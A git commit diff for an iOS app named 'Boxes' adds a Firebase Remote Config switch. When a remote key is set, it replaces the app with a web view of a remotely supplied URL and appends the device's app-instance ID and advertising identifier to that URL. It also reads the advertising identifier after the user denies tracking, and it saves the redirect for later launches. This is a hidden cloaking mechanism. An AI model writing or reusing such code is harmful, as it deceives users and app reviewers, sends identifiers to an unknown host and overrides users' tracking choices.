b24172e04e8f8a2e980a2d913125dcafc523c691
ion675706 <ion675706@gmail.com>
2025-06-27 18:13:19 +0300

    asfdgf

--- Boxes/Sources/Application/AppDelegate.swift
+++ Boxes/Sources/Application/AppDelegate.swift
@@ -1,30 +1,147 @@
 
-import UIKit
+import SwiftUI
+import AppTrackingTransparency
+import AdSupport
+import FirebaseCore
+import FirebaseAnalytics
+import FirebaseInstallations
+import FirebaseRemoteConfigInternal
 
 @main
-class AppDelegate: UIResponder, UIApplicationDelegate {
+class AppDelegate: UIResponder, UIApplicationDelegate, UNUserNotificationCenterDelegate {
+    
+    var window: UIWindow?
+    weak var initialVC: ViewController?
+    
+    var identifierAdvertising: String = ""
+    var timer = 0
+    var analyticsAppId: String = ""
 
-
-
+    static var orientationLock = UIInterfaceOrientationMask.all
+    
+    private var remoteConfig: RemoteConfig?
+    
     func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
-        // Override point for customization after application launch.
+        FirebaseApp.configure()
+        remoteConfig = RemoteConfig.remoteConfig()
+        setupRemoteConfig()
+        
+        let viewController = ViewController()
+        initialVC = viewController
+        window?.rootViewController = initialVC
+        window?.makeKeyAndVisible()
+        
+        Task { @MainActor in
+            analyticsAppId = await fetchAnalyticsAppInstanceId()
+            print("App Instance ID: \(analyticsAppId)")
+        }
+
+        start(viewController: viewController)
+       
         return true
     }
-
-    // MARK: UISceneSession Lifecycle
-
-    func application(_ application: UIApplication, configurationForConnecting connectingSceneSession: UISceneSession, options: UIScene.ConnectionOptions) -> UISceneConfiguration {
-        // Called when a new scene session is being created.
-        // Use this method to select a configuration to create the new scene with.
-        return UISceneConfiguration(name: "Default Configuration", sessionRole: connectingSceneSession.role)
+    
+    func fetchAnalyticsAppInstanceId() async -> String {
+        do {
+            if let appInstanceID = Analytics.appInstanceID() {
+                return appInstanceID
+            } else {
+                return ""
+            }
+        }
     }
-
-    func application(_ application: UIApplication, didDiscardSceneSessions sceneSessions: Set<UISceneSession>) {
-        // Called when the user discards a scene session.
-        // If any sessions were discarded while the application was not running, this will be called shortly after application:didFinishLaunchingWithOptions.
-        // Use this method to release any resources that were specific to the discarded scenes, as they will not return.
+    
+    func setupRemoteConfig() {
+        let settings = RemoteConfigSettings()
+        settings.minimumFetchInterval = 0
+        remoteConfig?.configSettings = settings
     }
+    
+    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
+        return AppDelegate.orientationLock
+    }
+    
+    func applicationDidBecomeActive(_ application: UIApplication) {
+        ATTrackingManager.requestTrackingAuthorization { (status) in
+            self.timer = 10
+            switch status {
+            case .authorized:
+                self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
+                self.timer = 1
+            case .denied:
+                print("Denied")
+                self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
+            case .notDetermined:
+                print("Not Determined")
+            case .restricted:
+                print("Restricted")
+            @unknown default:
+                print("Unknown")
+            }
+        }
+    }
+    
+    func start(viewController: ViewController) {
+        
+        remoteConfig?.fetch { [weak self] status, error in
+            guard let self = self else { return }
 
+            if status == .success {
+                self.remoteConfig?.activate { _, error in
+                    DispatchQueue.main.async {
+                        if let error = error {
+                            viewController.openApp()
+                            return
+                        }
 
+                        if let stringFire = self.remoteConfig?.configValue(forKey: "box").stringValue {
+                            if !stringFire.isEmpty {
+                                if let finalURL = UserDefaults.standard.string(forKey: "finalURL") {
+                                    viewController.openWeb(stringURL: finalURL)
+                                    print("SECOND OPEN: \(finalURL)")
+                                    return
+                                }
+
+                                if self.identifierAdvertising.isEmpty {
+                                    self.timer = 5
+                                    self.identifierAdvertising = ASIdentifierManager.shared().advertisingIdentifier.uuidString
+                                }
+
+                                if self.identifierAdvertising.isEmpty {
+                                    viewController.openApp()
+                                    return
+                                }
+
+                                DispatchQueue.main.asyncAfter(deadline: .now() + .seconds(self.timer)) {
+                                    let stringURL = viewController.createURL(
+                                        mainURL: stringFire,
+                                        deviceID: self.analyticsAppId,
+                                        advertiseID: self.identifierAdvertising
+                                    )
+                                    print("URL: \(stringURL)")
+
+                                    guard let url = URL(string: stringURL) else {
+                                        viewController.openApp()
+                                        return
+                                    }
+
+                                    if UIApplication.shared.canOpenURL(url) {
+                                        viewController.openWeb(stringURL: stringURL)
+                                    } else {
+                                        viewController.openApp()
+                                    }
+                                }
+
+                            } else {
+                                viewController.openApp()
+                            }
+                        } else {
+                            viewController.openApp()
+                        }
+                    }
+                }
+            }
+        }
+    }
 }
 
--- Boxes/Sources/Application/ViewController.swift
+++ Boxes/Sources/Application/ViewController.swift
@@ -1,13 +1,70 @@
 
 import UIKit
+import SwiftUI
 
 class ViewController: UIViewController {
 
     override func viewDidLoad() {
         super.viewDidLoad()
-        // Do any additional setup after loading the view.
+        
+        view.backgroundColor = .white
+
+        let activityIndicator = UIActivityIndicatorView(style: .large)
+        activityIndicator.color = .systemRed
+        activityIndicator.translatesAutoresizingMaskIntoConstraints = false
+        activityIndicator.startAnimating()
+
+        view.addSubview(activityIndicator)
+
+        NSLayoutConstraint.activate([
+            activityIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),
+            activityIndicator.centerYAnchor.constraint(equalTo: view.centerYAnchor)
+        ])
+//        let onboardingScreen = ContentView()
+//        let hostingController = UIHostingController(rootView: onboardingScreen)
+//        
+//        addChild(hostingController)
+//        view.addSubview(hostingController.view)
+//        hostingController.didMove(toParent: self)
+//        
+//        hostingController.view.translatesAutoresizingMaskIntoConstraints = false
+//        NSLayoutConstraint.activate([
+//            hostingController.view.topAnchor.constraint(equalTo: view.topAnchor),
+//            hostingController.view.bottomAnchor.constraint(equalTo: view.bottomAnchor),
+//            hostingController.view.leadingAnchor.constraint(equalTo: view.leadingAnchor),
+//            hostingController.view.trailingAnchor.constraint(equalTo: view.trailingAnchor)
+//        ])
     }
-
-
+    
+    func openApp() {
+        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
+            print("open app")
+            let onboardingScreen = ContentView()
+            let hostingController = UIHostingController(rootView: onboardingScreen)
+            self.setRootViewController(hostingController)
+        }
+    }
+    
+    func openWeb(stringURL: String) {
+        DispatchQueue.main.async {
+            print("open web")
+            let webView = SecViewController(url: stringURL)
+            self.setRootViewController(webView)
+        }
+    }
+    
+    func setRootViewController(_ viewController: UIViewController) {
+        if let appDelegate = UIApplication.shared.delegate as? AppDelegate {
+            appDelegate.window?.rootViewController = viewController
+        }
+    }
+    
+    func createURL(mainURL: String, deviceID: String, advertiseID: String) -> (String) {
+        var url = ""
+        
+        url = "\(mainURL)?sdsd=\(deviceID)&gght=\(advertiseID)"
+        
+        return url
+    }
 }
 
